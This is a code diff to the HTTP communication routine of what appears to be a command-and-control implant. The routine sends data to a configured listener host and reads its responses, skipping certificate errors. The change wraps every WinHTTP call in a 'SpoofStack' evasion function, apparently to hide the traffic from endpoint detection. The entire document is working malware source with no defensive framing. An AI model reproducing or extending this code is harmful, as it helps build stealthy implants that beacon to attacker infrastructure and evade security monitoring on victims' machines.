@@ -1,5 +1,6 @@
 #include "../../headers/http/Http.h"
 #include "../../headers/cstdreplacement/localcstd.h"
+#include "../../headers/agent/evasion/Common.h"
 #include <stdio.h>
 
 BOOL PerformRequest(BYTE* Buffer, SIZE_T BufferLength, OUT pDataBuffer Response) {
@@ -15,7 +16,7 @@ BOOL PerformRequest(BYTE* Buffer, SIZE_T BufferLength, OUT pDataBuffer Response)
 	BOOL Success = FALSE;
 	
 
-	HINTERNET hSession = agent->apis->pWinHttpOpen(agent->config->listenerConfig->UserAgent, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+	HINTERNET hSession = SpoofStack(agent->apis->pWinHttpOpen, 5, agent->config->listenerConfig->UserAgent, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
 
 	if (!hSession) {
 		printf("[!] Failure to create http session token: [%08x]\n", GetLastError());
@@ -26,14 +27,14 @@ BOOL PerformRequest(BYTE* Buffer, SIZE_T BufferLength, OUT pDataBuffer Response)
 
 	if (agent->config->listenerConfig->Secure)
 	{
-		if (!(hConnect = agent->apis->pWinHttpConnect(hSession, agent->config->listenerConfig->CurrentHost->Host, INTERNET_DEFAULT_HTTPS_PORT, 0))) {
+		if (!(hConnect = SpoofStack(agent->apis->pWinHttpConnect, 4, hSession, agent->config->listenerConfig->CurrentHost->Host, INTERNET_DEFAULT_HTTPS_PORT, 0))) {
 			printf("[!] Failure to connect to http server: [%08x]\n", GetLastError());
 			goto EXIT;
 		}
 
 		HTTP_FLAGS |= WINHTTP_FLAG_SECURE;
 
-		if (!(hRequest = agent->apis->pWinHttpOpenRequest(hConnect,(LPCWSTR) agent->config->listenerConfig->Method, HttpEndpoint, NULL, NULL, NULL, HTTP_FLAGS))) {
+		if (!(hRequest = SpoofStack(agent->apis->pWinHttpOpenRequest, 7, hConnect, (LPCWSTR) agent->config->listenerConfig->Method, HttpEndpoint, NULL, NULL, NULL, HTTP_FLAGS))) {
 			printf("[!] Failure to perform request to endpoint [%ls]. Err: [%08x]\n", "RegisterAgent", GetLastError());
 			goto EXIT;
 		}
@@ -43,7 +44,7 @@ BOOL PerformRequest(BYTE* Buffer, SIZE_T BufferLength, OUT pDataBuffer Response)
 			SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
 			SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
 
-		if (!agent->apis->pWinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &HTTP_FLAGS, sizeof(DWORD)))
+		if (!SpoofStack(agent->apis->pWinHttpSetOption, 4, hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &HTTP_FLAGS, sizeof(DWORD)))
 		{
 			printf("[!] Failure to set HTTP OPTIONS => [%08x]", GetLastError());
 			goto EXIT;
@@ -51,11 +52,11 @@ BOOL PerformRequest(BYTE* Buffer, SIZE_T BufferLength, OUT pDataBuffer Response)
 	}
 	
 	else {
-		if (!(hConnect = agent->apis->pWinHttpConnect(hSession, agent->config->listenerConfig->CurrentHost->Host, INTERNET_DEFAULT_HTTP_PORT, 0))) {
+		if (!(hConnect = SpoofStack(agent->apis->pWinHttpConnect,4, hSession, agent->config->listenerConfig->CurrentHost->Host, INTERNET_DEFAULT_HTTP_PORT, 0))) {
 			printf("[!] Failure to connect to http server: [%08x]\n", GetLastError());
 			goto EXIT;
 		}
-		if (!(hRequest = agent->apis->pWinHttpOpenRequest(hConnect, agent->config->listenerConfig->Method, generateRandomStringW(10), NULL, NULL, NULL, 0))) {
+		if (!(hRequest = SpoofStack(agent->apis->pWinHttpOpenRequest, 7, hConnect, agent->config->listenerConfig->Method, generateRandomStringW(10), NULL, NULL, NULL, 0))) {
 			printf("[!] Failure to perform request to endpoint [%ls]. Err: [%08x]\n", "RegisterAgent", GetLastError());
 			goto EXIT;
 		}
@@ -64,19 +65,19 @@ BOOL PerformRequest(BYTE* Buffer, SIZE_T BufferLength, OUT pDataBuffer Response)
 	
 	int index = 0;
 	while (agent->config->listenerConfig->Headers[index] != NULL) {
-		if (!agent->apis->pWinHttpAddRequestHeaders(hRequest, agent->config->listenerConfig->Headers[index], -1, WINHTTP_ADDREQ_FLAG_ADD)) {
+		if (!SpoofStack(agent->apis->pWinHttpAddRequestHeaders, 4, hRequest, agent->config->listenerConfig->Headers[index], -1, WINHTTP_ADDREQ_FLAG_ADD)) {
 			printf("[!] Failure to add request headers [%ls]\n", agent->config->listenerConfig->Headers[index]);
 		}
 		index++;
 	}
-	if (agent->apis->pWinHttpSendRequest(hRequest, NULL, 0, (LPVOID)Buffer, BufferLength, BufferLength, 0))
+	if (SpoofStack(agent->apis->pWinHttpSendRequest,7, hRequest, NULL, 0, (LPVOID)Buffer, BufferLength, BufferLength, 0))
 	{
-		if (agent->apis->pWinHttpReceiveResponse(hRequest, NULL))
+		if (SpoofStack(agent->apis->pWinHttpReceiveResponse, 2, hRequest, NULL))
 		{
 			DWORD StatusCode = 0;
 			DWORD StatusSize = sizeof(DWORD);
 
-			if (!agent->apis->pWinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
+			if (!SpoofStack(agent->apis->pWinHttpQueryHeaders, 6, hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
 				WINHTTP_HEADER_NAME_BY_INDEX,
 				&StatusCode,
 				&StatusSize,
@@ -96,7 +97,7 @@ BOOL PerformRequest(BYTE* Buffer, SIZE_T BufferLength, OUT pDataBuffer Response)
 
 				do
 				{
-					Success = agent->apis->pWinHttpReadData(hRequest, TempBuffer, sizeof(TempBuffer), &BytesRead);
+					Success = SpoofStack(agent->apis->pWinHttpReadData, 4, hRequest, TempBuffer, sizeof(TempBuffer), &BytesRead);
 					if (!Success || BytesRead == 0) {
 						break;
 					}
@@ -136,13 +137,13 @@ BOOL PerformRequest(BYTE* Buffer, SIZE_T BufferLength, OUT pDataBuffer Response)
 	}
 EXIT:
 	if (hRequest) {
-		agent->apis->pWinHttpCloseHandle(hRequest);
+		SpoofStack(agent->apis->pWinHttpCloseHandle, 1, hRequest);
 	}
 	if (hConnect) {
-		agent->apis->pWinHttpCloseHandle(hConnect);
+		SpoofStack(agent->apis->pWinHttpCloseHandle, 1, hConnect);
 	}
 	if (hSession) {
-		agent->apis->pWinHttpCloseHandle(hSession);
+		SpoofStack(agent->apis->pWinHttpCloseHandle, 1, hSession);
 	}
 
 	return Success;
